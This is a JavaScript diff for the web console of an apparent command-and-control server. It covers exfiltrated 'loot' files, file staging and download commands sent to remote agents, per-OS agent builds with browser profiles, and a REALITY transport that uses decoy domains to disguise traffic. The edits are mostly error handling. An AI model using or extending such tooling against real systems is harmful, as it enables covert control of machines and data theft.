+            lootList.innerHTML = `<p class="list-error" role="alert">Unable to load files: ${escapeHtml(err.message)}. Refresh this page to retry.</p>`;
+        });
 }
 
 function downloadLoot(lootId) {
+    const status = document.getElementById("loot-download-status");
+    status.textContent = "Downloading…";
     apiFetch(`/api/loot/download/${lootId}`)
         .then((res) => {
+            if (!res.ok) throw new Error(`Server returned ${res.status}`);
             const filename = (res.headers.get("Content-Disposition") || "")
                 .match(/filename="?([^"]+)"?/)?.[1] || "loot";
             return res.blob().then((blob) => ({ blob, filename }));
@@ -649,29 +828,40 @@ function downloadLoot(lootId) {
             a.click();
             document.body.removeChild(a);
             window.URL.revokeObjectURL(url);
+            status.textContent = "Download sent to your browser.";
         })
-        .catch(() => { });
+        .catch((err) => {
+            status.textContent = `Download failed: ${err.message}. You can retry using Download.`;
+        });
 }
 
 function deleteLoot(lootId) {
     if (!confirm("Delete this exfiltrated file?")) return;
+    const status = document.getElementById("loot-action-status");
+    status.textContent = "Deleting file…";
     apiFetch(`/api/loot/${lootId}`, { method: "DELETE" })
-        .then(() => loadLoot())
-        .catch(() => { });
+        .then(async (res) => {
+            const data = await res.json();
+            if (!res.ok || data.status !== "ok") throw new Error(data.error || `Server returned ${res.status}`);
+            status.textContent = "File deleted.";
+            loadLoot();
+        })
+        .catch((err) => { status.textContent = `File deletion failed: ${err.message}`; });
 }
 
-// ═══════════════════════════════════════════
-//  FILE STAGING (Server → Agent)
-// ═══════════════════════════════════════════
+// Files staged for agents.
 
 function stageFile() {
     const input = document.getElementById("stage-file-input");
     const btn = document.getElementById("stage-btn");
+    const status = document.getElementById("stage-action-status");
 
     if (!input.files || input.files.length === 0) {
-        alert("Select a file first");
+        status.textContent = "Select a file first.";
         return;
     }
+
+    status.textContent = "";
 
     const formData = new FormData();
     formData.append("file", input.files[0]);
@@ -683,32 +873,38 @@ function stageFile() {
         method: "POST",
         body: formData,
     })
-        .then((res) => res.json())
+        .then(async (res) => {
+            const data = await res.json();
+            if (!res.ok || data.error) throw new Error(data.error || `Server returned ${res.status}`);
+            return data;
+        })
         .then((data) => {
-            if (data.error) {
-                alert("Error: " + data.error);
-            } else {
-                input.value = "";
-                loadStagedFiles();
-            }
+            input.value = "";
+            status.textContent = `Staged ${data.filename || "file"}.`;
+            loadStagedFiles();
             btn.disabled = false;
             btn.textContent = "📤 Upload & Stage";
         })
         .catch((err) => {
-            alert("Upload failed: " + err.message);
+            status.textContent = "Upload failed: " + err.message;
             btn.disabled = false;
             btn.textContent = "📤 Upload & Stage";
         });
 }
 
 function sendFileToAgent(input) {
-    if (!input.files || input.files.length === 0 || !selectedAgentId) return;
+    if (!input.files || input.files.length === 0 || !selectedAgentId || fileUploadInProgress) return;
+    const agentId = selectedAgentId;
+    const viewVersion = terminalViewVersion;
+    const isCurrentView = () => agentId === selectedAgentId && viewVersion === terminalViewVersion;
+    const status = document.getElementById("send-file-status");
 
     const file = input.files[0];
+    fileUploadInProgress = true;
+    status.textContent = `Uploading ${file.name} for ${agentId}…`;
     const formData = new FormData();
     formData.append("file", file);
 
-    // Disable button while uploading
     const btn = document.getElementById("send-file-btn");
     const originalText = btn.innerHTML;
     btn.disabled = true;
@@ -725,32 +921,33 @@ function sendFileToAgent(input) {
         method: "POST",
         body: formData,
     })
-        .then((res) => res.json())
-        .then((data) => {
-            if (data.error) {
-                appendToTerminal(`
-                    <div class="cmd-output cmd-error">Upload Error: ${escapeHtml(data.error)}</div>
-                `);
-            } else {
-                // File staged on server! Now send the download command to the agent.
-                // We'll just drop it in the agent's current directory with the same filename.
-                const command = `download ${data.file_id} ${data.filename}`;
-
-                // Set the command input value so sendCommand() picks it up
-                commandInput.value = command;
-                sendCommand();
-
-                loadStagedFiles();
+        .then(async (res) => {
+            const data = await res.json();
+            if (!res.ok || !data || data.error || !Number.isSafeInteger(data.file_id) || data.file_id < 1 ||
+                typeof data.filename !== "string" || !data.filename.trim()) {
+                throw new Error(data?.error || `Invalid staging response (${res.status || "unknown status"})`);
             }
+            return data;
+        })
+        .then(async (data) => {
+            loadStagedFiles();
+            const result = await sendCommand({
+                command: `download ${data.file_id} ${data.filename}`, agentId, viewVersion,
+            });
+            status.textContent = result.ok
+                ? `${file.name}: download queued for ${agentId}. Check that agent's Task History.`
+                : `${file.name} is staged, but task submission for ${agentId} failed: ${result.error}`;
         })
         .catch((err) => {
-            appendToTerminal(`
+            status.textContent = `Upload failed for ${agentId}: ${err.message}`;
+            if (isCurrentView()) appendToTerminal(`
                 <div class="cmd-output cmd-error">Upload failed: ${escapeHtml(err.message)}</div>
             `);
         })
         .finally(() => {
             input.value = ""; // Reset file input
-            btn.disabled = false;
+            fileUploadInProgress = false;
+            btn.disabled = !selectedAgentId;
             btn.innerHTML = originalText;
         });
 }
@@ -758,9 +955,13 @@ function sendFileToAgent(input) {
 function loadStagedFiles() {
     const list = document.getElementById("staged-file-list");
     apiFetch("/api/files")
-        .then((res) => res.json())
+        .then((res) => {
+            if (!res.ok) throw new Error(`Server returned ${res.status}`);
+            return res.json();
+        })
         .then((data) => {
-            if (!data.files || data.files.length === 0) {
+            if (!data || !Array.isArray(data.files)) throw new Error("Invalid file-list response");
+            if (data.files.length === 0) {
                 list.innerHTML = `<div class="empty-state small"><p>No files staged</p></div>`;
                 return;
             }
@@ -780,30 +981,47 @@ function loadStagedFiles() {
                 )
                 .join("");
         })
-        .catch(() => { });
+        .catch((err) => {
+            list.innerHTML = `<p class="list-error" role="alert">Unable to load files: ${escapeHtml(err.message)}. Refresh this page to retry.</p>`;
+        });
 }
 
 function deleteStagedFile(fileId) {
     if (!confirm("Delete this staged file?")) return;
+    const status = document.getElementById("staged-delete-status");
+    status.textContent = "Deleting staged file…";
     apiFetch(`/api/files/${fileId}`, { method: "DELETE" })
-        .then(() => loadStagedFiles())
-        .catch(() => { });
+        .then(async (res) => {
+            const data = await res.json();
+            if (!res.ok || data.status !== "ok") throw new Error(data.error || `Server returned ${res.status}`);
+            status.textContent = "Staged file deleted.";
+            loadStagedFiles();
+        })
+        .catch((err) => { status.textContent = `Staged file deletion failed: ${err.message}`; });
 }
 
-// ─── Auto-select browser profile when OS changes ───
+// Keep the default profile consistent with the selected OS.
 const buildOsSelect = document.getElementById("build-os");
 const buildProfileSelect = document.getElementById("build-profile");
+const buildArchSelect = document.getElementById("build-arch");
+const buildArch386Option = document.getElementById("build-arch-386");
 
-if (buildOsSelect && buildProfileSelect) {
-    buildOsSelect.addEventListener("change", () => {
-        const os = buildOsSelect.value;
-        // Default profile per OS: Chrome/Windows=1, Chrome/Linux=2, Safari/macOS=5
-        const defaults = { windows: "1", linux: "2", mac: "5" };
-        buildProfileSelect.value = defaults[os] || "1";
-    });
+function syncBuildTargetFields() {
+    const os = buildOsSelect.value;
+    const defaults = { windows: "1", linux: "2", mac: "5" };
+    buildProfileSelect.value = defaults[os] || "1";
+    buildArch386Option.disabled = os === "mac";
+    if (buildArch386Option.disabled && buildArchSelect.value === "386") {
+        buildArchSelect.value = "amd64";
+    }
 }
 
-// ─── Event Listeners ───
+if (buildOsSelect && buildProfileSelect && buildArchSelect && buildArch386Option) {
+    buildOsSelect.addEventListener("change", syncBuildTargetFields);
+    syncBuildTargetFields();
+}
+
+// Event listeners.
 commandInput.addEventListener("keydown", (e) => {
     if (e.key === "Enter") {
         e.preventDefault();
@@ -817,24 +1035,48 @@ refreshBtn.addEventListener("click", () => {
     refreshAgents();
 });
 
-// ─── Auto-Refresh Loop ───
+// Automatic refresh.
 setInterval(() => {
     refreshAgents();
     loadStats();
     if (lootOpen) loadLoot();
 }, REFRESH_INTERVAL);
 
-// ─── Initial Load ───
-if (!sessionStorage.getItem("api_key")) {
-    showAuthOverlay();
-} else {
-    refreshAgents();
-    loadStats();
+// Initial load
+refreshAgents();
+loadStats();
+
+// Sync transport-field visibility with the selector's current value.
+// Browsers may restore a previously selected option (e.g. REALITY) after
+// navigation, while the HTML defaults hide the REALITY fields. This call
+// reconciles visibility without discarding any entered values.
+toggleTransportFields();
+
+// Re-synchronize on pageshow, load, and DOMContentLoaded to handle browser form restoration
+// (e.g. when navigating back/forward via browser history where form state is restored after script execution).
+if (typeof window !== "undefined" && window.addEventListener) {
+    window.addEventListener("pageshow", () => {
+        toggleTransportFields();
+        setTimeout(toggleTransportFields, 0);
+    });
+    window.addEventListener("load", () => {
+        toggleTransportFields();
+        setTimeout(toggleTransportFields, 0);
+    });
+}
+if (typeof document !== "undefined" && document.addEventListener) {
+    document.addEventListener("DOMContentLoaded", () => {
+        toggleTransportFields();
+        setTimeout(toggleTransportFields, 0);
+    });
+}
+const transportSelector = document.getElementById("build-transport");
+if (transportSelector && transportSelector.addEventListener) {
+    transportSelector.addEventListener("change", toggleTransportFields);
+    transportSelector.addEventListener("input", toggleTransportFields);
 }
 
-// ═══════════════════════════════════════════
-//  TLS
-// ═══════════════════════════════════════════
+// TLS certificate management.
 
 function loadTlsStatus() {
     const body = document.getElementById("tls-status-body");
@@ -881,7 +1123,7 @@ function loadTlsStatus() {
                 </div>
                 <div class="tls-pin-block">
                     <span class="tls-cert-label">SPKI Pin (SHA-256)</span>
-                    <code class="tls-pin-code" onclick="copyPin('${escapeHtml(c.spki_pin)}')" title="Click to copy">${escapeHtml(c.spki_pin)}</code>
+                    <code class="tls-pin-code" onclick="copyPin(${htmlStringArgument(c.spki_pin)})" title="Click to copy">${escapeHtml(c.spki_pin)}</code>
                     <span class="tls-restart-note">Click pin to copy. Restart the server after any cert change</span>
                 </div>`;
 
@@ -961,25 +1203,131 @@ function deleteCert() {
     if (!confirm("Delete the certificate and key? The server will fall back to HTTP on next restart. All pinned agents will stop connecting.")) return;
 
     const btn = document.getElementById("tls-delete-btn");
+    const status = document.getElementById("tls-action-status");
+    status.textContent = "";
     btn.disabled = true;
     btn.textContent = "DELETING…";
 
     apiFetch("/api/tls/delete", { method: "DELETE" })
-        .then((r) => r.json())
+        .then(async (res) => {
+            const data = await res.json();
+            if (!res.ok || data.error) throw new Error(data.error || `Server returned ${res.status}`);
+            return data;
+        })
         .then((data) => {
             btn.disabled = false;
             btn.textContent = "DELETE CERTIFICATE";
 
-            if (data.error) {
-                alert("Error: " + data.error);
-                return;
-            }
-
+            status.textContent = "Certificate deleted. Restart the server to apply the change.";
             loadTlsStatus();
         })
         .catch((err) => {
             btn.disabled = false;
             btn.textContent = "DELETE CERTIFICATE";
-            alert("Network error: " + err.message);
+            status.textContent = "Certificate deletion failed: " + err.message;
         });
+}
+
+// REALITY transport controls.
+
+/**
+ * Toggle visibility of REALITY-specific fields vs the Server Callback URL
+ * field based on the transport mode selector.
+ */
+function toggleTransportFields() {
+    const transportEl = document.getElementById("build-transport");
+    if (!transportEl) return;
+    const mode = transportEl.value;
+    const serverUrlGroup = document.getElementById("server-url-group");
+    const realityFields = document.getElementById("reality-fields");
+
+    if (mode === "reality") {
+        if (serverUrlGroup) serverUrlGroup.style.display = "none";
+        if (realityFields) realityFields.style.display = "block";
+    } else {
+        if (serverUrlGroup) serverUrlGroup.style.display = "block";
+        if (realityFields) realityFields.style.display = "none";
+    }
+}
+
+let certificateMeasurementVersion = 0;
+let certificateMeasurementController = null;
+const certificateMeasurementHint = "Estimate only: checks the presented certificate chain against REALITY's 8,192-byte limit; confirm with a live REALITY connection.";
+
+function resetCertificateMeasurement() {
+    certificateMeasurementVersion++;
+    if (certificateMeasurementController) certificateMeasurementController.abort();
+    certificateMeasurementController = null;
+    const hint = document.getElementById("decoy-domain-hint");
+    if (hint) {
+        hint.textContent = certificateMeasurementHint;
+        hint.className = "form-hint";
+    }
+    const button = document.getElementById("check-domain-btn");
+    if (button) {
+        button.disabled = false;
+        button.textContent = "Measure";
+    }
+}
+
+function checkDecoyDomain() {
+    resetCertificateMeasurement();
+    const domainInput = document.getElementById("build-decoy-domain");
+    const hintEl = document.getElementById("decoy-domain-hint");
+    const checkBtn = document.getElementById("check-domain-btn");
+    const domain = domainInput.value.trim();
+
+    if (!domain) {
+        hintEl.textContent = "Enter a domain first.";
+        hintEl.className = "form-hint domain-check-result error";
+        return;
+    }
+
+    const version = certificateMeasurementVersion;
+    certificateMeasurementController = new AbortController();
+    checkBtn.disabled = true;
+    checkBtn.textContent = "Measuring…";
+    hintEl.textContent = `Measuring ${domain}'s certificate chain…`;
+    hintEl.className = "form-hint";
+
+    apiFetch("/api/reality/check-domain", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ domain }),
+        signal: certificateMeasurementController.signal,
+    })
+        .then((res) => res.json())
+        .then((data) => {
+            if (version !== certificateMeasurementVersion) return;
+            if (domainInput.value.trim() !== domain) {
+                resetCertificateMeasurement();
+                return;
+            }
+
+            if (data.ok && Number.isInteger(data.size_bytes) && data.size_bytes > 0 &&
+                Number.isInteger(data.limit_bytes) && data.limit_bytes > 0 &&
+                typeof data.fits === "boolean") {
+                hintEl.textContent = `Certificate size: ${data.size_bytes.toLocaleString()} bytes: ${data.fits ? "Fits" : "Does not fit"}. Estimate only; confirm with a live REALITY connection.`;
+                hintEl.className = `form-hint domain-check-result ${data.fits ? "success" : "error"}`;
+            } else {
+                hintEl.textContent = `Measurement unavailable: ${data.error || "Unexpected response"}`;
+                hintEl.className = "form-hint domain-check-result error";
+            }
+        })
+        .catch((err) => {
+            if (version !== certificateMeasurementVersion || err.name === "AbortError") return;
+            hintEl.textContent = `Measurement unavailable: ${err.message}`;
+            hintEl.className = "form-hint domain-check-result error";
+        })
+        .finally(() => {
+            if (version !== certificateMeasurementVersion) return;
+            certificateMeasurementController = null;
+            checkBtn.disabled = false;
+            checkBtn.textContent = "Measure";
+        });
+}
+
+const decoyDomainEl = document.getElementById("build-decoy-domain");
+if (decoyDomainEl && decoyDomainEl.addEventListener) {
+    decoyDomainEl.addEventListener("input", resetCertificateMeasurement);
 }
